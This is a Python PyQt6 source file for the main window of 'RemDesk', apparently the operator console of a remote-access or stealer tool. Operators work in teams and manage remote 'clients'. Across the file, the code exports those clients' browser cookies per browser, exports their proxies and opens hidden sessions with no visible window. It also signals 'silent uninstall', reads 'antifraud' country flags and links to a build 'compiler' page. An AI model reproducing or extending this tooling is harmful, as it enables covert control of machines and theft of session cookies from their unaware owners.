from typing import Dict, List
from urllib.parse import urlsplit, urlunsplit
import os

from PyQt6 import QtCore, QtGui, QtWidgets

from ..core.api import DEFAULT_API_TOKEN, DEFAULT_API_URL, RemoteControllerApi
from ..core.constants import APP_NAME
from ..core.i18n import I18n
from ..core.logging import EventLogger
from ..core.settings import SettingsStore
from ..core.translations import LANGUAGE_NAMES
from .common import GlassFrame, animate_widget, load_icon, make_button
from .remote_session import RemoteSessionDialog, build_session_url, webengine_available
from .pages.compiler import CompilerPage
from .pages.cookies import CookiesPage
from .pages.proxy import ProxyPage
from .pages.client_details import ClientDetailsPage
from .pages.dashboard import DashboardPage
from .browser_catalog import browser_keys_from_config
from .pages.instructions import InstructionsPage
from .pages.settings import SettingsPage
from .pages.teams import TeamsPage


class MainShell(QtWidgets.QWidget):
    page_changed = QtCore.pyqtSignal(str)
    logout_requested = QtCore.pyqtSignal()

    def __init__(
        self,
        i18n: I18n,
        settings: SettingsStore,
        logger: EventLogger,
        api: RemoteControllerApi | None = None,
    ):
        super().__init__()
        self.i18n = i18n
        self.settings = settings
        self.logger = logger
        self.api = api
        self.current_role = self.settings.get("role", "operator")
        self._ping_ms = None
        self._server_online = None
        self._session_windows: Dict[str, RemoteSessionDialog] = {}
        self._storage_windows: Dict[str, RemoteSessionDialog] = {}
        self._utility_sessions: Dict[str, RemoteSessionDialog] = {}
        self._ice_servers_cache: list[dict[str, object]] | None = None
        layout = QtWidgets.QHBoxLayout(self)
        layout.setContentsMargins(18, 18, 18, 18)
        layout.setSpacing(18)

        self.sidebar = GlassFrame(radius=22, tone="card", tint_alpha=170, border_alpha=70)
        self.sidebar.setObjectName("Sidebar")
        self.sidebar.setFixedWidth(236)
        sidebar_layout = QtWidgets.QVBoxLayout(self.sidebar)
        sidebar_layout.setContentsMargins(16, 16, 16, 16)
        sidebar_layout.setSpacing(12)

        self.workflow_label = QtWidgets.QLabel()
        self.workflow_label.setObjectName("SidebarSection")
        sidebar_layout.addWidget(self.workflow_label)

        self.nav_buttons = {}
        self.nav_group = QtWidgets.QButtonGroup(self)
        self.nav_group.setExclusive(True)
        nav_items = [
            ("main", "nav_main", "clients"),
            ("teams", "nav_teams", "team"),
            ("cookies", "nav_cookies", "cookies"),
            ("proxy", "nav_proxy", "more"),
            ("compiler", "nav_compiler", "build"),
        ]
        for key, _, icon_name in nav_items:
            button = self._build_nav_button(icon_name)
            self.nav_group.addButton(button)
            self.nav_buttons[key] = button
            sidebar_layout.addWidget(button)
            button.clicked.connect(lambda _, page_key=key: self.switch_page(page_key))

        self.settings_label = QtWidgets.QLabel()
        self.settings_label.setObjectName("SidebarSection")
        sidebar_layout.addWidget(self.settings_label)

        for key, icon_name in [("instructions", "instructions"), ("settings", "settings")]:
            button = self._build_nav_button(icon_name)
            self.nav_group.addButton(button)
            self.nav_buttons[key] = button
            sidebar_layout.addWidget(button)
            button.clicked.connect(lambda _, page_key=key: self.switch_page(page_key))

        self.language_button = QtWidgets.QToolButton()
        self.language_button.setProperty("nav", True)
        self.language_button.setAutoRaise(True)
        self.language_button.setToolButtonStyle(
            QtCore.Qt.ToolButtonStyle.ToolButtonTextBesideIcon
        )
        self.language_button.setPopupMode(
            QtWidgets.QToolButton.ToolButtonPopupMode.InstantPopup
        )
        language_icon = load_icon("language", "dark")
        if not language_icon.isNull():
            self.language_button.setIcon(language_icon)
            self.language_button.setIconSize(QtCore.QSize(16, 16))
        self.language_menu = QtWidgets.QMenu(self.language_button)
        self._build_language_menu()
        self.language_button.setMenu(self.language_menu)
        sidebar_layout.addWidget(self.language_button)

        self.clear_data_button = make_button("", "nav")
        self.clear_data_button.setProperty("nav", True)
        self._apply_nav_icon(self.clear_data_button, "trash")
        self.clear_data_button.clicked.connect(self.clear_local_data)
        sidebar_layout.addWidget(self.clear_data_button)

        sidebar_layout.addStretch()
        self.operator_label = QtWidgets.QLabel()
        self.operator_label.setObjectName("OperatorBadge")
        sidebar_layout.addWidget(self.operator_label)
        self.status_label = QtWidgets.QLabel()
        self.status_label.setObjectName("StatusBadge")
        self.status_label.setProperty("status", "unknown")
        sidebar_layout.addWidget(self.status_label)
        self.sidebar_footer = QtWidgets.QLabel(self.i18n.t("ping_unavailable"))
        self.sidebar_footer.setObjectName("Muted")
        sidebar_layout.addWidget(self.sidebar_footer)
        self.logout_button = make_button("", "ghost")
        self.logout_button.setObjectName("DangerText")
        self._apply_nav_icon(self.logout_button, "logout")
        self.logout_button.clicked.connect(self.logout_requested.emit)
        sidebar_layout.addWidget(self.logout_button)

        layout.addWidget(self.sidebar)

        content_frame = QtWidgets.QFrame()
        content_layout = QtWidgets.QVBoxLayout(content_frame)
        content_layout.setContentsMargins(0, 0, 0, 0)
        content_layout.setSpacing(12)

        self.connection_banner = QtWidgets.QFrame()
        self.connection_banner.setObjectName("ConnectionBanner")
        banner_layout = QtWidgets.QHBoxLayout(self.connection_banner)
        banner_layout.setContentsMargins(14, 10, 14, 10)
        banner_layout.setSpacing(10)
        self.banner_icon = QtWidgets.QLabel("!")
        self.banner_icon.setObjectName("ConnectionBannerIcon")
        self.banner_text = QtWidgets.QLabel()
        self.banner_text.setObjectName("ConnectionBannerText")
        self.banner_text.setWordWrap(True)
        self.banner_retry = make_button("", "primary")
        self.banner_retry.clicked.connect(self.trigger_reconnect)
        banner_layout.addWidget(self.banner_icon)
        banner_layout.addWidget(self.banner_text, 1)
        banner_layout.addWidget(self.banner_retry)
        self.connection_banner.setVisible(False)
        content_layout.addWidget(self.connection_banner)

        self.stack = QtWidgets.QStackedWidget()
        self.dashboard = DashboardPage(i18n, settings, logger, api=api)
        self.cookies_page = CookiesPage(i18n, settings, api=api)
        self.client_details = ClientDetailsPage(i18n, settings, api=api)
        self.proxy_page = ProxyPage(i18n, settings, api=api)
        self.teams_page = TeamsPage(i18n, settings, api=api)
        self.compiler = CompilerPage(i18n, settings, logger)
        self.settings_page = SettingsPage(i18n, settings, api=api)
        self.instructions_page = InstructionsPage(i18n)
        self.stack.addWidget(self.dashboard)
        self.stack.addWidget(self.cookies_page)
        self.stack.addWidget(self.client_details)
        self.stack.addWidget(self.proxy_page)
        self.stack.addWidget(self.teams_page)
        self.stack.addWidget(self.compiler)
        self.stack.addWidget(self.settings_page)
        self.stack.addWidget(self.instructions_page)
        content_layout.addWidget(self.stack, 1)

        layout.addWidget(content_frame, 1)

        self.dashboard.storage_requested.connect(self.open_storage)
        self.dashboard.connect_requested.connect(self.toggle_connection)
        self.dashboard.extra_action_requested.connect(self.handle_extra_action)
        self.dashboard.delete_requested.connect(self.handle_delete_request)
        self.dashboard.client_selected.connect(self.open_client_details)
        self.dashboard.ping_updated.connect(self.update_ping)
        self.dashboard.server_status_changed.connect(self.handle_server_status)
        self.dashboard.clients_refreshed.connect(self.handle_clients_refreshed)
        self.cookies_page.extra_action_requested.connect(self.handle_extra_action)
        self.cookies_page.client_selected.connect(self.open_client_details)
        self.proxy_page.extra_action_requested.connect(self.handle_extra_action)
        self.proxy_page.client_selected.connect(self.open_client_details)
        self.client_details.back_requested.connect(self.show_clients)
        self.client_details.connect_requested.connect(self.toggle_connection)
        self.client_details.storage_requested.connect(self.open_storage)
        self.client_details.extra_action_requested.connect(self.handle_extra_action)
        self.client_details.delete_requested.connect(self.dashboard.confirm_delete_client)
        self.client_details.rename_requested.connect(self.rename_client)
        self.client_details.client_updated.connect(self.handle_client_update)
        self.settings_page.logout_requested.connect(self.logout_requested.emit)
        self.settings_page.language_changed.connect(self.emit_language_change)
        self.settings_page.role_changed.connect(self.handle_role_change)
        self.settings_page.profile_updated.connect(self.update_operator_label)
        self.teams_page.teams_updated.connect(self.update_operator_label)

        self.apply_translations()
        self.update_role_visibility()
        self.nav_buttons["main"].setChecked(True)
        self.switch_page("main")

    def apply_translations(self) -> None:
        self.workflow_label.setText(self.i18n.t("sidebar_workflow"))
        self.settings_label.setText(self.i18n.t("sidebar_settings"))
        self.nav_buttons["compiler"].setText(self.i18n.t("nav_compiler"))
        self.nav_buttons["main"].setText(self.i18n.t("nav_main"))
        self.nav_buttons["cookies"].setText(self.i18n.t("nav_cookies"))
        self.nav_buttons["proxy"].setText(self.i18n.t("nav_proxy"))
        self.nav_buttons["teams"].setText(self.i18n.t("nav_teams"))
        self.nav_buttons["settings"].setText(self.i18n.t("nav_settings"))
        self.nav_buttons["instructions"].setText(self.i18n.t("nav_instructions"))
        self.language_button.setText(self.i18n.t("sidebar_language"))
        self.clear_data_button.setText(self.i18n.t("sidebar_clear_data"))
        self.logout_button.setText(self.i18n.t("top_logout"))
        self.banner_text.setText(self.i18n.t("server_connection_lost"))
        self.banner_retry.setText(self.i18n.t("server_connection_retry"))
        self._render_status_label()
        self.update_brand_header()
        self.update_operator_label()
        self.dashboard.apply_translations()
        self.cookies_page.apply_translations()
        self.client_details.apply_translations()
        self.proxy_page.apply_translations()
        self.teams_page.apply_translations()
        self.compiler.apply_translations()
        self.settings_page.apply_translations()
        self.instructions_page.apply_translations()
        self._build_language_menu()
        self._render_ping_label()

    def _build_nav_button(self, icon_name: str | None) -> QtWidgets.QPushButton:
        button = make_button("", "nav")
        button.setCheckable(True)
        button.setMinimumHeight(38)
        button.setProperty("nav", True)
        if icon_name:
            self._apply_nav_icon(button, icon_name)
        return button

    def _apply_nav_icon(self, button: QtWidgets.QAbstractButton, icon_name: str) -> None:
        icon = load_icon(icon_name, "dark")
        if icon.isNull():
            return
        button.setIcon(icon)
        button.setIconSize(QtCore.QSize(16, 16))

    def _build_language_menu(self) -> None:
        self.language_menu.clear()
        group = QtGui.QActionGroup(self.language_menu)
        group.setExclusive(True)
        current = self.i18n.language()
        for code, name in LANGUAGE_NAMES.items():
            action = QtGui.QAction(name, group)
            action.setCheckable(True)
            action.setChecked(code == current)
            action.triggered.connect(lambda _, lang=code: self.emit_language_change(lang))
            self.language_menu.addAction(action)

    def clear_local_data(self) -> None:
        self.settings.clear_user_data()
        self.logout_requested.emit()

    def open_client_details(self, client_id: str) -> None:
        client = next((c for c in self.dashboard.clients if c["id"] == client_id), None)
        if client is None:
            return
        self.client_details.set_client(client)
        self.stack.setCurrentIndex(2)
        if "main" in self.nav_buttons:
            self.nav_buttons["main"].setChecked(True)
        self.update_brand_header()
        animate_widget(self.client_details)

    def show_clients(self) -> None:
        self.switch_page("main")

    def rename_client(self, client_id: str) -> None:
        self.dashboard.edit_client_name(client_id)
        client = next((c for c in self.dashboard.clients if c["id"] == client_id), None)
        if client and self.client_details.client and self.client_details.client.get("id") == client_id:
            self.client_details.set_client(client)

    def handle_client_update(self, client_id: str, updates: dict) -> None:
        if not client_id:
            return
        updated = False
        for client in self.dashboard.clients:
            if client.get("id") == client_id:
                client.update(updates)
                updated = True
                break
        if updated:
            self.dashboard.refresh_view()
            if self.client_details.client and self.client_details.client.get("id") == client_id:
                self.client_details.set_client(
                    {**self.client_details.client, **updates}
                )
            self.settings.set("clients", self.dashboard.clients)
            self.settings.save()

    def handle_clients_refreshed(self, clients: list[dict]) -> None:
        if not self.client_details.client:
            return
        current_id = self.client_details.client.get("id")
        if not current_id:
            return
        updated = next((c for c in clients if c.get("id") == current_id), None)
        if updated:
            self.client_details.set_client(updated)

    def update_brand_header(self) -> None:
        window = self.window()
        if window and hasattr(window, "set_header"):
            window.set_header(APP_NAME)

    def _current_page_label(self) -> str:
        index = self.stack.currentIndex()
        titles = [
            self.i18n.t("nav_main"),
            self.i18n.t("nav_cookies"),
            self.i18n.t("client_details_title"),
            self.i18n.t("nav_proxy"),
            self.i18n.t("nav_teams"),
            self.i18n.t("nav_compiler"),
            self.i18n.t("nav_settings"),
            self.i18n.t("nav_instructions"),
        ]
        if 0 <= index < len(titles):
            return titles[index]
        return ""

    def _resolve_team_label(self) -> str:
        team_id = self.settings.get("operator_team_id", "")
        if not team_id:
            return self.i18n.t("unassigned_label")
        for team in self.settings.get("teams", []):
            if team.get("id") == team_id:
                return team.get("name") or team_id
        return team_id

    def switch_page(self, key: str) -> None:
        if key in self.nav_buttons:
            self.nav_buttons[key].setChecked(True)
        mapping = {
            "main": 0,
            "cookies": 1,
            "proxy": 3,
            "teams": 4,
            "compiler": 5,
            "settings": 6,
            "instructions": 7,
        }
        index = mapping.get(key, 0)
        self.stack.setCurrentIndex(index)
        self.update_brand_header()
        if key == "teams":
            self.teams_page.refresh_from_api()
        if key == "cookies":
            self.cookies_page.refresh_clients()
        if key == "proxy":
            self.proxy_page.refresh_clients()
        animate_widget(self.stack.currentWidget())

    def update_role_visibility(self) -> None:
        self.nav_buttons["teams"].setVisible(True)

    def open_storage(self, client_id: str) -> None:
        client = next((c for c in self.dashboard.clients if c["id"] == client_id), None)
        client_name = client["name"] if client else client_id
        self.logger.log("log_storage_open", client=client_name)
        session = self._session_windows.get(client_id)
        if session:
            session.open_storage_drawer()
            session.raise_()
            session.activateWindow()
            return
        storage_window = self._storage_windows.get(client_id)
        if storage_window:
            storage_window.open_storage_drawer()
            storage_window.raise_()
            storage_window.activateWindow()
            return
        self._open_storage_session(client_id)

    def toggle_connection(self, client_id: str, currently_connected: bool) -> None:
        client = next((c for c in self.dashboard.clients if c["id"] == client_id), None)
        if not client:
            return
        if currently_connected:
            self._close_session(client_id)
            client["connected"] = False
            self.logger.log("log_disconnect", client=client["name"])
        else:
            self.logger.log("log_connect", client=client["name"])
            if self._open_session(client_id):
                client["connected"] = True
                self.logger.log("log_connected", client=client["name"])
        self.dashboard.refresh_view()
        if self.client_details.client and self.client_details.client.get("id") == client_id:
            self.client_details.set_client(client)
        self.settings.set("clients", self.dashboard.clients)
        self.settings.save()

    def handle_delete_request(self, client_id: str) -> None:
        client = next((c for c in self.dashboard.clients if c["id"] == client_id), None)
        client_name = client["name"] if client else client_id
        self.logger.log("log_delete_requested", client=client_name)
        self.send_silent_uninstall(client_id, client_name)
        if self.client_details.client and self.client_details.client.get("id") == client_id:
            self.show_clients()

    def handle_extra_action(self, client_id: str, action: str) -> None:
        if not action:
            return
        if action.startswith("cookies:"):
            browser = action.split(":", 1)[1] or "all"
            browsers = [] if browser == "all" else [browser]
            self.request_cookie_export(client_id, browsers)
            return
        if action == "proxy":
            self.request_proxy_export(client_id)
            return

    def request_cookie_export(self, client_id: str, browsers: list[str]) -> None:
        client = next((c for c in self.dashboard.clients if c["id"] == client_id), None)
        client_name = client["name"] if client else client_id
        label = ", ".join(browsers) if browsers else self.i18n.t("menu_cookies_all")
        folder = QtWidgets.QFileDialog.getExistingDirectory(
            self, self.i18n.t("storage_pick_folder"), ""
        )
        if not folder:
            return
        filename = self._build_cookie_filename(browsers)
        window = self._session_windows.get(client_id) or self._storage_windows.get(client_id)
        if window is None:
            window = self._open_utility_session(client_id)
            if window is None:
                return
            self._schedule_utility_close(client_id)
        window.request_cookie_export(browsers, filename=filename, download_dir=folder)
        self.logger.log("log_cookies_request", client=client_name, browsers=label, path=folder)

    def request_proxy_export(self, client_id: str) -> None:
        client = next((c for c in self.dashboard.clients if c["id"] == client_id), None)
        client_name = client["name"] if client else client_id
        folder = QtWidgets.QFileDialog.getExistingDirectory(
            self, self.i18n.t("storage_pick_folder"), ""
        )
        if not folder:
            return
        safe_id = self._sanitize_filename_token(client_id)
        filename = f"proxy_{safe_id}.txt"
        window = self._session_windows.get(client_id) or self._storage_windows.get(client_id)
        if window is None:
            window = self._open_utility_session(client_id)
            if window is None:
                return
            self._schedule_utility_close(client_id)
        window.request_proxy_export(client_id, filename=filename, download_dir=folder)
        self.logger.log("log_proxy_request", client=client_name, path=folder)

    @staticmethod
    def _sanitize_filename_token(value: str) -> str:
        cleaned = "".join(ch if ch.isalnum() or ch in {"-", "_"} else "_" for ch in value)
        return cleaned or "client"

    @staticmethod
    def _build_cookie_filename(browsers: list[str]) -> str:
        stamp = QtCore.QDateTime.currentDateTime().toString("yyyyMMdd_HHmmss")
        label = "all" if not browsers else "_".join(browsers)
        return f"cookies_{label}_{stamp}.json"

    def send_silent_uninstall(self, client_id: str, client_name: str) -> None:
        # TODO: integrate with remote control backend to trigger uninstall.
        self.logger.log("log_delete_signal", client=client_name)

    def emit_language_change(self, lang: str) -> None:
        self.page_changed.emit(f"lang:{lang}")

    def handle_role_change(self, role: str) -> None:
        self.current_role = role
        self.teams_page.set_role(role)
        self.dashboard.set_role(role)
        self.update_role_visibility()

    def update_ping(self, ping_ms: object) -> None:
        self._ping_ms = ping_ms if isinstance(ping_ms, int) else None
        self._render_ping_label()

    def update_operator_label(self) -> None:
        account_id = self.settings.get("account_id", "")
        display_name = self.settings.get("operator_name", "").strip()
        if not display_name and account_id:
            display_name = self.teams_page.resolve_operator_name(account_id) or ""
        if display_name:
            label = display_name
        elif account_id:
            label = account_id
        else:
            label = self.i18n.t("operator_unknown")
        role = self.settings.get("role", "operator")
        role_key = f"settings_role_{role}"
        role_label = self.i18n.t(role_key)
        if role_label == role_key:
            role_label = role
        team_label = self._resolve_team_label()
        self.operator_label.setText(f"{label} | {team_label} | {role_label}")

    def _resolve_server_url(self) -> str:
        url = str(self.settings.get("api_url", "") or "").strip()
        if not url:
            url = DEFAULT_API_URL
        if "://" not in url:
            url = f"http://{url}"
        parsed = urlsplit(url)
        return urlunsplit((parsed.scheme, parsed.netloc, parsed.path or "", "", ""))

    def _resolve_api_token(self) -> str:
        token = str(self.settings.get("api_token", "") or "").strip()
        if not token:
            token = DEFAULT_API_TOKEN
        return token

    def _force_host_ice(self) -> bool:
        value = os.getenv("RC_FORCE_HOST_ICE", "").strip().lower()
        if value in {"1", "true", "yes", "on"}:
            return True
        value = os.getenv("RC_ICE_HOST_ONLY", "").strip().lower()
        if value in {"1", "true", "yes", "on"}:
            return True
        return False

    def _resolve_ice_servers(self) -> list[dict[str, object]] | None:
        if self._force_host_ice():
            return []
        if self._ice_servers_cache is not None:
            return self._ice_servers_cache
        if not self.api:
            return None
        try:
            servers = self.api.fetch_ice_servers()
        except Exception:
            servers = None
        self._ice_servers_cache = servers
        return servers

    def _open_session(self, client_id: str, open_storage: bool = False) -> bool:
        if not client_id:
            QtWidgets.QMessageBox.warning(
                self,
                "RemDesk",
                "Unable to open session: missing client id.",
            )
            return False
        client = next((c for c in self.dashboard.clients if c["id"] == client_id), None)
        base_url = self._resolve_server_url()
        token = self._resolve_api_token()
        ice_servers = self._resolve_ice_servers()
        region = ""
        country = ""
        country_code = ""
        flags: list[str] = []
        if client:
            region = str(client.get("region") or "").strip()
            country = region
            config = client.get("client_config") or {}
            available_browsers = browser_keys_from_config(config)
            if isinstance(config, dict):
                antifraud = config.get("antifraud") or {}
                if isinstance(antifraud, dict):
                    raw_flags = antifraud.get("countries") or []
                    if isinstance(raw_flags, list):
                        flags = [str(code).upper() for code in raw_flags if str(code).strip()]
            if flags:
                country_code = flags[0]
        else:
            available_browsers = []
        if client_id in self._session_windows:
            window = self._session_windows[client_id]
            window.apply_context(
                server_url=base_url,
                token=token,
                session_id=client_id,
                region=region or None,
                country=country or None,
                country_code=country_code or None,
                flags=flags or None,
                auto_connect=True,
                open_storage=open_storage,
                manage_mode=False,
                ice_servers=ice_servers,
                storage_only=False,
                available_browsers=available_browsers,
            )
            window.raise_()
            window.activateWindow()
            return True

        session_url = build_session_url(
            base_url,
            client_id,
            token,
            open_storage=open_storage,
            mode="view",
            storage_only=False,
            region=region or None,
            country=country or None,
            country_code=country_code or None,
            flags=flags or None,
        )

        if not webengine_available():
            QtWidgets.QMessageBox.warning(
                self,
                "RemDesk",
                "PyQt6-WebEngine is required to open remote sessions in a window.",
            )
            return False

        dialog = RemoteSessionDialog(
            client_id,
            session_url,
            base_url,
            token,
            open_storage,
            manage_mode=False,
            ice_servers=ice_servers,
            storage_only=False,
            show_window=True,
            region=region or None,
            country=country or None,
            country_code=country_code or None,
            flags=flags or None,
            available_browsers=available_browsers,
            parent=self,
        )
        dialog.closed.connect(self._handle_session_closed)
        self._session_windows[client_id] = dialog
        dialog.show()
        return True

    def _open_storage_session(self, client_id: str) -> bool:
        if not client_id:
            QtWidgets.QMessageBox.warning(
                self,
                "RemDesk",
                "Unable to open storage: missing client id.",
            )
            return False
        base_url = self._resolve_server_url()
        token = self._resolve_api_token()
        ice_servers = self._resolve_ice_servers()
        client = next((c for c in self.dashboard.clients if c.get("id") == client_id), None)
        available_browsers = browser_keys_from_config(
            client.get("client_config") if isinstance(client, dict) else None
        )
        if client_id in self._storage_windows:
            window = self._storage_windows[client_id]
            window.apply_context(
                server_url=base_url,
                token=token,
                session_id=client_id,
                auto_connect=True,
                open_storage=True,
                manage_mode=False,
                ice_servers=ice_servers,
                storage_only=True,
                available_browsers=available_browsers,
            )
            window.raise_()
            window.activateWindow()
            return True

        session_url = build_session_url(
            base_url,
            client_id,
            token,
            open_storage=True,
            mode="view",
            storage_only=True,
        )

        if not webengine_available():
            QtWidgets.QMessageBox.warning(
                self,
                "RemDesk",
                "PyQt6-WebEngine is required to open storage sessions in a window.",
            )
            return False

        dialog = RemoteSessionDialog(
            client_id,
            session_url,
            base_url,
            token,
            True,
            manage_mode=False,
            ice_servers=ice_servers,
            storage_only=True,
            show_window=True,
            available_browsers=available_browsers,
            parent=self,
        )
        dialog.closed.connect(self._handle_storage_session_closed)
        self._storage_windows[client_id] = dialog
        dialog.show()
        return True

    def _open_utility_session(self, client_id: str) -> RemoteSessionDialog | None:
        if not client_id:
            QtWidgets.QMessageBox.warning(
                self,
                "RemDesk",
                "Unable to open session: missing client id.",
            )
            return None
        base_url = self._resolve_server_url()
        token = self._resolve_api_token()
        ice_servers = self._resolve_ice_servers()
        client = next((c for c in self.dashboard.clients if c.get("id") == client_id), None)
        available_browsers = browser_keys_from_config(
            client.get("client_config") if isinstance(client, dict) else None
        )
        if client_id in self._utility_sessions:
            window = self._utility_sessions[client_id]
            window.apply_context(
                server_url=base_url,
                token=token,
                session_id=client_id,
                auto_connect=True,
                open_storage=False,
                manage_mode=False,
                ice_servers=ice_servers,
                storage_only=False,
                available_browsers=available_browsers,
            )
            return window

        session_url = build_session_url(
            base_url,
            client_id,
            token,
            open_storage=False,
            mode="view",
            storage_only=False,
        )

        if not webengine_available():
            QtWidgets.QMessageBox.warning(
                self,
                "RemDesk",
                "PyQt6-WebEngine is required to export client data.",
            )
            return None

        dialog = RemoteSessionDialog(
            client_id,
            session_url,
            base_url,
            token,
            False,
            manage_mode=False,
            ice_servers=ice_servers,
            storage_only=False,
            show_window=False,
            available_browsers=available_browsers,
            parent=self,
        )
        dialog.closed.connect(self._handle_utility_session_closed)
        self._utility_sessions[client_id] = dialog
        dialog.show()
        return dialog

    def _schedule_utility_close(self, client_id: str, delay_ms: int = 60000) -> None:
        def _close_if_idle() -> None:
            window = self._utility_sessions.get(client_id)
            if window is None:
                return
            window.close()

        QtCore.QTimer.singleShot(delay_ms, _close_if_idle)

    def _handle_storage_session_closed(self, client_id: str) -> None:
        self._storage_windows.pop(client_id, None)

    def _handle_utility_session_closed(self, client_id: str) -> None:
        self._utility_sessions.pop(client_id, None)

    def _close_session(self, client_id: str) -> None:
        dialog = self._session_windows.pop(client_id, None)
        if dialog:
            dialog.close()

    def _handle_session_closed(self, client_id: str) -> None:
        self._session_windows.pop(client_id, None)
        client = next((c for c in self.dashboard.clients if c["id"] == client_id), None)
        if not client or not client.get("connected"):
            return
        client["connected"] = False
        self.logger.log("log_disconnect", client=client.get("name", client_id))
        self.dashboard.refresh_view()
        self.settings.set("clients", self.dashboard.clients)
        self.settings.save()

    def _render_ping_label(self) -> None:
        if self._ping_ms is None:
            self.sidebar_footer.setText(self.i18n.t("ping_unavailable"))
        else:
            self.sidebar_footer.setText(f'{self.i18n.t("ping_label")}: {self._ping_ms} ms')

    def handle_server_status(self, online: bool) -> None:
        if self._server_online is online:
            return
        self._server_online = online
        self._render_status_label()
        self.connection_banner.setVisible(not online)

    def _render_status_label(self) -> None:
        if self._server_online is None:
            status_key = "top_status_unknown"
            status_value = "unknown"
        else:
            status_key = "top_status_online" if self._server_online else "top_status_offline"
            status_value = "online" if self._server_online else "offline"
        self.status_label.setText(f'{self.i18n.t("top_status_label")}: {self.i18n.t(status_key)}')
        self.status_label.setProperty("status", status_value)
        self.status_label.style().unpolish(self.status_label)
        self.status_label.style().polish(self.status_label)

    def trigger_reconnect(self) -> None:
        self.dashboard.refresh_clients()
        self.teams_page.refresh_from_api()
